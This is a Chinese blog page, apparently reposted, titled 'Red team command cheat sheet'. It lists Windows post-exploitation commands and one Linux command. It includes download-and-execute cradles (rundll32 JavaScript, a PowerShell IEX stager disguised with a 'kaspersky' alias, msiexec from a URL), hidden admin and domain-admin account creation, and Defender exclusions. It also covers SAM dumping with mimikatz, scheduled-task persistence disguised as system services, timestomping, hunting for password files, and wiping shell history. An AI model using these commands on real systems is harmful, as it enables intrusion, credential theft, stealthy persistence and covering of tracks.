href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">网络安全<sup>1</sup></a><a href="/tags/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/" style="font-size: 1.05rem;">资源分享<sup>2</sup></a><a href="/tags/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/" style="font-size: 1.05rem;">逆向破解<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">转载</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/" itemprop="url">资源分享</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>资源分享</span></a><a class="article-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>网络安全</span></a></span></div></div><h1 class="post-title" itemprop="name headline">红队命令速查-洞查文库</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-10-13T08:07:27.000Z" title="发表于 2024-10-13 16:07:27">2024-10-13</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-11-25T17:21:09.191Z" title="更新于 2024-11-26 01:21:09">2024-11-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">9.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>47分钟</span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为北京"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>北京</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://www.dmoe.cc/random.php?_r_=81f1a3c5-8dad-760e-8945-1fc4ba6212fa"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://doc.vulexp.cn"><header><a class="post-meta-categories" href="/categories/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/" itemprop="url">资源分享</a><a href="/tags/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/" tabindex="-1" itemprop="url">资源分享</a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">网络安全</a><h1 id="CrawlerTitle" itemprop="name headline">红队命令速查-洞查文库</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Explangcn</span><time itemprop="dateCreated datePublished" datetime="2024-10-13T08:07:27.000Z" title="发表于 2024-10-13 16:07:27">2024-10-13</time><time itemprop="dateCreated datePublished" datetime="2024-11-25T17:21:09.191Z" title="更新于 2024-11-26 01:21:09">2024-11-26</time></header><h1 id="红队命令速查-洞查文库"><a href="#红队命令速查-洞查文库" class="headerlink" title="红队命令速查-洞查文库"></a>红队命令速查-洞查文库</h1><h2 id="Windows-命令速查"><a href="#Windows-命令速查" class="headerlink" title="Windows 命令速查"></a>Windows 命令速查</h2><h2 id="TCP-出网探测"><a href="#TCP-出网探测" class="headerlink" title="TCP 出网探测"></a>TCP 出网探测</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Test-NetConnection -ComputerName [目标主机名或IP] -Port [端口号]</span><br></pre></td></tr></table></figure>

<h2 id="远程下载文件"><a href="#远程下载文件" class="headerlink" title="远程下载文件"></a>远程下载文件</h2><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f &quot;http://127.0.0.1:8080/file.exe&quot; &quot;C:/Windows/temp/file.exe&quot;</span><br><span class="line"></span><br><span class="line">//从 http://127.0.0.1:8080/ 下载 file.exe 并保存到 C:/Windows/temp/file.exe</span><br></pre></td></tr></table></figure>

<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command &quot;Invoke-WebRequest -Uri &#x27;https://www.example.com/file.zip&#x27; -OutFile &#x27;C:\Downloads\file.zip&#x27;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="BitsAdmin"><a href="#BitsAdmin" class="headerlink" title="BitsAdmin"></a>BitsAdmin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer &quot;JobName&quot; /download /priority normal https://www.example.com/file.zip C:\path\to\save\file.zip</span><br></pre></td></tr></table></figure>

<h3 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.3.150/chfs/shared/1Z3.exe&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</span><br></pre></td></tr></table></figure>

<h2 id="IIS-网站查询"><a href="#IIS-网站查询" class="headerlink" title="IIS 网站查询"></a>IIS 网站查询</h2><h3 id="查看-IIS-绑定的网站："><a href="#查看-IIS-绑定的网站：" class="headerlink" title="查看 IIS 绑定的网站："></a>查看 IIS 绑定的网站：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%windir%\system32\inetsrv\appcmd.exe list sites</span><br></pre></td></tr></table></figure>

<h3 id="查看-Site-ID-为-1-的物理路径："><a href="#查看-Site-ID-为-1-的物理路径：" class="headerlink" title="查看 Site ID 为 1 的物理路径："></a>查看 Site ID 为 1 的物理路径：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%windir%\system32\inetsrv\appcmd list site /site.id:1 /config | findstr &quot;physicalPath&quot;</span><br></pre></td></tr></table></figure>

<h3 id="IIS-配置文件："><a href="#IIS-配置文件：" class="headerlink" title="IIS 配置文件："></a>IIS 配置文件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\inetsrv\config\applicationHost.config</span><br><span class="line">%SystemRoot%\System32\inetsrv\config\applicationHost.config</span><br></pre></td></tr></table></figure>

<h2 id="查看-Windows-系统版本："><a href="#查看-Windows-系统版本：" class="headerlink" title="查看 Windows 系统版本："></a>查看 Windows 系统版本：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get Caption,osarchitecture</span><br></pre></td></tr></table></figure>

<h2 id="修改文件时间"><a href="#修改文件时间" class="headerlink" title="修改文件时间"></a>修改文件时间</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -command &quot;(Get-Item &#x27;C:\path\to\your\file.txt&#x27;).CreationTime = &#x27;2024-01-01 12:00 AM&#x27;; (Get-Item &#x27;C:\path\to\your\file.txt&#x27;).LastWriteTime = &#x27;2024-01-02 12:00 AM&#x27;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h2><h3 id="查看端口对应-PID："><a href="#查看端口对应-PID：" class="headerlink" title="查看端口对应 PID："></a>查看端口对应 PID：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr :80</span><br></pre></td></tr></table></figure>

<h3 id="查看-PID-对应程序："><a href="#查看-PID-对应程序：" class="headerlink" title="查看 PID 对应程序："></a>查看 PID 对应程序：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /FI &quot;PID eq 1234&quot;</span><br></pre></td></tr></table></figure>

<h3 id="根据-PID-查看程序所在目录："><a href="#根据-PID-查看程序所在目录：" class="headerlink" title="根据 PID 查看程序所在目录："></a>根据 PID 查看程序所在目录：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where ProcessId=1234 get ExecutablePath</span><br></pre></td></tr></table></figure>

<h3 id="执行进程："><a href="#执行进程：" class="headerlink" title="执行进程："></a>执行进程：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start /b  xxx.exe</span><br></pre></td></tr></table></figure>

<h3 id="根据名称结束进程："><a href="#根据名称结束进程：" class="headerlink" title="根据名称结束进程："></a>根据名称结束进程：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill /f /t /im GotoHTTP.exe</span><br></pre></td></tr></table></figure>

<h3 id="搜索进程"><a href="#搜索进程" class="headerlink" title="搜索进程"></a>搜索进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr &quot;powershell&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Powershell-无窗口执行-EXE"><a href="#Powershell-无窗口执行-EXE" class="headerlink" title="Powershell 无窗口执行 EXE"></a>Powershell 无窗口执行 EXE</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -executionPolicy bypass Start-Process -WindowStyle hidden -FilePath &#x27;C:/Windows/temp/rd.exe&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="net-命令"><a href="#net-命令" class="headerlink" title="net 命令"></a>net 命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">查看用户列表: net user</span><br><span class="line">powershell查看用户列表: Get-WmiObject -Class Win32_UserAccount</span><br><span class="line">查看用户组列表: net localgroup</span><br><span class="line">查看管理组列表: net localgroup Administrators</span><br><span class="line">添加用户并设置密码: net user test P@ssw0rd /add</span><br><span class="line">将用户加入管理组: net localgroup Administrators test /add</span><br><span class="line">将用户加入桌面组: net localgroup &quot;Remote Desktop Users&quot; guest /add</span><br><span class="line">激活guest用户: net user guest /active:yes</span><br><span class="line">更改guest用户的密码: net user guest P@ssw0rd</span><br><span class="line">将用户加入管理组: net localgroup administrators guest /add</span><br><span class="line">将用户加入桌面组: net localgroup &quot;Remote Desktop Users&quot; guest /add</span><br><span class="line">查看本地密码策略: net accounts</span><br><span class="line">查看当前会话: net session</span><br><span class="line">建立IPC会话: net use \\127.0.0.1\c$ &quot;P@ssw0rd&quot; /user:&quot;domain\Administrator&quot;</span><br></pre></td></tr></table></figure>

<h2 id="netsh-操作防火墙"><a href="#netsh-操作防火墙" class="headerlink" title="netsh 操作防火墙"></a>netsh 操作防火墙</h2><h3 id="查看防火墙配置："><a href="#查看防火墙配置：" class="headerlink" title="查看防火墙配置："></a>查看防火墙配置：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure>

<h3 id="Windows-Server-2003-及之前的版本，允许指定程序全部连接"><a href="#Windows-Server-2003-及之前的版本，允许指定程序全部连接" class="headerlink" title="Windows Server 2003 及之前的版本，允许指定程序全部连接"></a>Windows Server 2003 及之前的版本，允许指定程序全部连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram C:\nc.exe &quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure>

<h3 id="Windows-Server-2003之后的版本"><a href="#Windows-Server-2003之后的版本" class="headerlink" title="Windows Server 2003之后的版本"></a>Windows Server 2003之后的版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir in action=allow program=&quot;C:\nc.exe</span><br></pre></td></tr></table></figure>

<h3 id="允许3389放行"><a href="#允许3389放行" class="headerlink" title="允许3389放行"></a>允许3389放行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>

<h2 id="WIndows-Defender-加白排除目录："><a href="#WIndows-Defender-加白排除目录：" class="headerlink" title="WIndows Defender 加白排除目录："></a>WIndows Defender 加白排除目录：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\wbem\wmic.exe /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath=C:\</span><br><span class="line"></span><br><span class="line">powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath &quot;C:\test&quot;</span><br></pre></td></tr></table></figure>

<h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">echo test &gt; C:\test.txt //写入-覆盖</span><br><span class="line">echo test &gt;&gt; c:\test.txt //追加有换行</span><br><span class="line">set /p=test&lt;nul&gt;C:\test.txt //写入</span><br><span class="line">set /p=&quot;121d2&quot;&gt;&gt;C:\test.txt //不换行追加</span><br><span class="line"></span><br><span class="line">//powershell不换行追加</span><br><span class="line">powershell -Command &quot;[System.IO.File]::AppendAllText(&#x27;C:\windows\temp\111.txt&#x27;, &#x27;test&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">//规避空格</span><br><span class="line">echo.123&gt;&gt;a.txt</span><br><span class="line">echo,123&gt;&gt;a.txt</span><br><span class="line">type;a.txt</span><br><span class="line"></span><br><span class="line">//将base64编码的文件解码写入到 test.jsp</span><br><span class="line">certutil -f -decode base64.txt C:\\test.jsp</span><br><span class="line"></span><br><span class="line">//将十六进制文件解码写入到 test.jsp</span><br><span class="line">certutil -decodehex hex.txt C:\\test.jsp</span><br></pre></td></tr></table></figure>

<h2 id="注册表："><a href="#注册表：" class="headerlink" title="注册表："></a>注册表：</h2><h3 id="Restricted-Admin-Mode"><a href="#Restricted-Admin-Mode" class="headerlink" title="Restricted Admin Mode"></a>Restricted Admin Mode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">对应命令行开启 Restricted Admin mode 命令如下：</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line">查看是否已开启 DisableRestrictedAdmin REG_DWORD 0x0 存在就是开启</span><br><span class="line">REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot;</span><br></pre></td></tr></table></figure>

<h3 id="查看3389端口"><a href="#查看3389端口" class="headerlink" title="查看3389端口"></a>查看3389端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://forum.ywhack.com/coding.php">https://forum.ywhack.com/coding.php</a> 端口查询</p>
</blockquote>
<h3 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure>

<h3 id="导出-SAM-数据库"><a href="#导出-SAM-数据库" class="headerlink" title="导出 SAM 数据库"></a>导出 SAM 数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM sys.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line"></span><br><span class="line">复制：</span><br><span class="line">C:\Windows\System32\config\SYSTEM</span><br><span class="line">C:\Windows\System32\config\SAM</span><br><span class="line"></span><br><span class="line">使用 https://github.com/3gstudent/NinjaCopy 进行复制。</span><br><span class="line"></span><br><span class="line">lsadump::sam /sam:sam.hiv /system:system.hiv</span><br></pre></td></tr></table></figure>

<h2 id="查看盘符剩余空间"><a href="#查看盘符剩余空间" class="headerlink" title="查看盘符剩余空间"></a>查看盘符剩余空间</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## 大小为字节磁盘</span><br><span class="line">::查看C盘</span><br><span class="line">wmic LogicalDisk where &quot;Caption=&#x27;C:&#x27;&quot; get FreeSpace,Size /value</span><br><span class="line">::查看D盘</span><br><span class="line">wmic LogicalDisk where &quot;Caption=&#x27;D:&#x27;&quot; get FreeSpace,Size /value</span><br></pre></td></tr></table></figure>

<h2 id="搜索文件："><a href="#搜索文件：" class="headerlink" title="搜索文件："></a>搜索文件：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#搜索 D 盘下名为 shell.jsp 的文件</span><br><span class="line">cd /d D:\ &amp;&amp; dir /b /s shell.jsp</span><br><span class="line"></span><br><span class="line">#搜素 D 盘下后缀为 conf 内容且包含 password（不区分大小写）:</span><br><span class="line">findstr /s /i /n /d:D:\ &quot;password&quot; *.conf</span><br></pre></td></tr></table></figure>

<h2 id="CS-上线"><a href="#CS-上线" class="headerlink" title="CS 上线"></a>CS 上线</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString(&#x27;http://122.114.55.117:8012/download/upload.ps1&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /q /i http://127.0.0.1:8080/ms10-051.msi</span><br></pre></td></tr></table></figure>

<h2 id="设置文件属性"><a href="#设置文件属性" class="headerlink" title="设置文件属性"></a>设置文件属性</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +s +a +h +r cs.exe // 给文件设置系统文件属性、存档文件属性、隐藏文件属性、只读文件属性</span><br></pre></td></tr></table></figure>

<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /ru system /tn &quot;Microsoft\Windows\Multimedia\SystemMediaService&quot; /sc ONSTART /tr &quot;C:\cs.exe&quot; </span><br><span class="line">// 创建一个名为Microsoft\Windows\Multimedia\SystemMediaService，开机时执行 c:\cs.exe 的计 划任务，需要管理员权限</span><br><span class="line"></span><br><span class="line">schtasks /change /tn &quot;Microsoft\Windows\Multimedia\SystemSoundsService&quot; /ru system /tr &quot;C:\cs.exe&quot; /enable </span><br><span class="line">// 修改Microsoft\Windows\Multimedia\SystemSoundsService 计划任务，需要管理员权限， 更改任务无法通过 /sc、/mo 参数更改计划频率</span><br></pre></td></tr></table></figure>

<h2 id="RDP-凭据"><a href="#RDP-凭据" class="headerlink" title="RDP 凭据"></a>RDP 凭据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#列出所有 RDP 凭证</span><br><span class="line">C:\Users\用户名\AppData\Local\Microsoft\Credentials</span><br><span class="line"></span><br><span class="line">dir /a C:\Users\Administrator\AppData\Local\Microsoft\Credentials</span><br></pre></td></tr></table></figure>

<h2 id="Windows-打包目录上传文件"><a href="#Windows-打包目录上传文件" class="headerlink" title="Windows 打包目录上传文件"></a>Windows 打包目录上传文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command &quot;Compress-Archive -Path E:\update\ -DestinationPath E:\test.zip&quot;</span><br><span class="line"></span><br><span class="line">7z.exe a -r -p12345 C:\webs\1.7z C:\webs\</span><br><span class="line"></span><br><span class="line">zip -r C:\webs\1.zip C:\webs\</span><br></pre></td></tr></table></figure>

<h2 id="域渗透命令"><a href="#域渗透命令" class="headerlink" title="域渗透命令"></a>域渗透命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">whoami /user  //查看当前用户权限</span><br><span class="line">net config workstation  //可知域名和其他信息</span><br><span class="line">net user /domain  //查询域用户</span><br><span class="line">net user edgeuser Admin12345 /add /domain  //添加域用户</span><br><span class="line">net group &quot;domain admins&quot; edgeuser /add /domain  //添加域管理员</span><br><span class="line">net group &quot;enterprise admins&quot; edgeuser /add /domain  //添加企业管理员</span><br><span class="line">net group &quot;domain admins&quot; /domain  //查询域管理员用户</span><br><span class="line">net group &quot;enterprise admins&quot; /domain  //查询域企业管理组</span><br><span class="line">net localgroup administrators /domain  //查询域本地管理组</span><br><span class="line">net time /domain  //查询域控制器和时间</span><br><span class="line">net view /domain  //查询域名称</span><br><span class="line">net view /domain:redteam.local  //查询域内计算机</span><br><span class="line">net group &quot;domain computers&quot; /domain  //查看当前域内计算机列表</span><br><span class="line">net group &quot;domain controllers&quot; /domain  //查看域控机器名</span><br><span class="line">net accounts /domain  //查看域密码策略</span><br><span class="line">nltest /domain_trusts  //查看域信任</span><br><span class="line">nltest /domain_trusts /all_trusts /v /server:10.10.10.10  //查看某个域的域信任</span><br><span class="line">nslookup -type=SRV _ldap._tcp.corp  //通过srv记录查找域控制器</span><br></pre></td></tr></table></figure>

<h2 id="Linux-命令速查"><a href="#Linux-命令速查" class="headerlink" title="Linux 命令速查"></a>Linux 命令速查</h2><h2 id="本次不记录命令"><a href="#本次不记录命令" class="headerlink" title="本次不记录命令"></a>本次不记录命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0</span><br></pre></td></tr></table></figure>

